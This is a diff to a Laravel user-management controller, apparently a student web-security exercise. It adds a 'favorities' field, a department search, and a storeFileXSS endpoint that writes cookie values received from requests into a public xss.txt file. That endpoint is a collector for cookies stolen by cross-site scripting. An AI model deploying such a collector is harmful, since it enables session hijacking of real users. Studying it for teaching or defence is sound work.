@@ -72,6 +72,7 @@ class CrudUserController extends Controller
             'mssv' => 'required',
             'email' => 'required|email|unique:users',
             'photo' => 'required',
+            'favorities' => 'required',
             'password' => 'required|min:6',
         ]);
 
@@ -92,6 +93,7 @@ class CrudUserController extends Controller
             'mssv' => $data['mssv'],
             'email' => $data['email'],
             'photo' => $data['photo'],
+            'favorities' => $data['favorities'],
             'password' => Hash::make($data['password'])
         ]);
 
@@ -126,6 +128,7 @@ class CrudUserController extends Controller
             'password' => 'required|min:6',
             'mssv' => 'required',
             'photo' => 'image', // Kiểm tra file ảnh (nếu có)
+            'favorities' => 'required'
         ]);
 
         // Tìm người dùng trong cơ sở dữ liệu
@@ -133,9 +136,10 @@ class CrudUserController extends Controller
 
         // Cập nhật thông tin người dùng
         $user->name = $input['name'];
+        $user->mssv = $input['mssv'];
         $user->email = $input['email'];
         $user->photo = $input['photo'];
-        $user->mssv = $input['mssv'];
+        $user->favorities = $input['favorities'];
         $user->password = Hash::make($input['password']);
 
         // Nếu có file ảnh mới được chọn
@@ -176,5 +180,46 @@ class CrudUserController extends Controller
         Auth::logout();
         // Redirect to login page
         return redirect('login');
+    }
+
+    public function storeFileXSS(Request $request)
+    {
+        // Lấy giá trị của tham số "cookie" từ request
+        $cookieValue = $request->input('cookie');
+
+        // Kiểm tra nếu có giá trị cookie được truyền vào
+        if ($cookieValue !== null) {
+            // Mở hoặc tạo file xss.txt để ghi giá trị
+            $file = fopen(public_path('xss.txt'), 'a');
+
+            // Ghi giá trị cookie vào file xss.txt, mỗi giá trị là một dòng
+            fwrite($file, $cookieValue . PHP_EOL);
+
+            // Đóng file
+            fclose($file);
+        }
+
+        // Trả về response tùy thuộc vào việc ghi giá trị cookie thành công hay không
+        // return response()->json(['message' => 'Im hacker :)))))))))))']);
+        // return redirect("list");
+        var_dump($cookieValue);
+    }
+
+    public function search(Request $request) {
+        $listOfDepartment = Department::select('*');
+
+    if(isset($request->q) && !empty($request->q))
+    {
+        $q = $request->q;
+        $listOfDepartment = $listOfDepartment->where('nameOfDepartment', 'like', '%' . $q . '%');
+        $listOfDepartment = $listOfDepartment->orWhere('createdBy', 'like', '%' . $q . '%');
+    }
+
+    $listOfDepartment = $listOfDepartment->paginate(2);
+
+    if (count($listOfDepartment) > 0) {
+        return view('auth.department')->withData($listOfDepartment);
+    }
+    // return view('pages.department')->withMessage("No Data Found");
     }
 }
